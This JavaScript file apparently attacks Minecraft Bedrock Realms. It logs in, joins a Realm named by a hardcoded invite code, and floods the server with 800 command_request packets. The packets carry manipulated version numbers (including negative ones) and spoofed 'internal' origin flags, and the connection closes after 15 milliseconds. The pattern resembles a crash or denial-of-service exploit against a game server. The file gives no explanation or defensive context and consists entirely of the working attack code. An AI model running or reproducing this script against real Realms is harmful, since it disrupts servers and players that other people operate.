const { Authflow, Titles } = require("prismarine-auth")
const { RealmAPI } = require("prismarine-realms")
const { createClient } = require("bedrock-protocol")

let cmd = (message, version, internal) => ({
    command: `/me ${message}`,
    internal,
    version,
    origin: {
        type: internal ? 5 : 0,
        uuid: "0",
        request_id: "0",
    }
})

let flow = new Authflow("", "profiles")
let api = RealmAPI.from(flow, "bedrock")
let code = "4xvwttAahqYGsrg" // or code

setTimeout(async () => {
    let realm = code.length < 10 ? await api.getRealm(code) : await api.getRealmFromInvite(code)
    console.log(realm)
    let client = createClient({
        username: "",
        profilesFolder: "profiles",
        realms: {
            realmId: realm.id
        }
    })

    client.once("play_status", () => {
        for (let i = 0; i < 400; i++) {
            client.queue('command_request', cmd("test", -i, true))
            client.queue('command_request', cmd("test", i, false))
        }
        setTimeout(() => {
          client.close()
        }, 15)
       
    })

    client.on('error', (err) => console.error(err))
    client.on('disconnect', (packet) => console.log('Disconnected:', packet))
    client.on("close", () => console.log("closed"))
})